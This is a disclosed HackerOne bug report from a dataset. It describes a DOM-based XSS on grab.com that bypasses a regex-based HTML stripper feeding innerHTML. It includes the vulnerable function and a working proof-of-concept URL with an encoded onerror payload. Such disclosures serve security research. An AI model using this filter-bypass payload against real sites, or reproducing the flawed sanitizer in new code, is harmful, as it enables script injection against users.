---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '247246'
original_report_id: '247246'
title: Dom based xss affecting all pages from https://www.grab.com/.
weakness: Cross-site Scripting (XSS) - DOM
team_handle: grab
created_at: '2017-07-08T17:18:20.693Z'
disclosed_at: '2017-08-17T19:51:18.812Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# Dom based xss affecting all pages from https://www.grab.com/.

## Metadata

- HackerOne Report ID: 247246
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: grab
- Disclosed At: 2017-08-17T19:51:18.812Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,

there's a dom based xss vulnerability affecting all pages under the domain https://www.grab.com/.
This vulnerability wasn't properly patched so I managed to bypass the regular expressioned that was added into the function.

Vulnerable code:
````
var stripHtml = (function () {
		  var div = document.createElement('div');
		  return function (html) {
		    div.innerHTML = html.replace(/<\/?\w+[^>]*\/?>/g, "");
		    return (div.innerText || div.textContent); // textContent is for firefox
		  };
		})();
``````

PoC: https://www.grab.com/sg/partnerships/?xss=%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E

visit url above to reproduce.

A screenshot is attached to this report.

cheers,
Mario.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
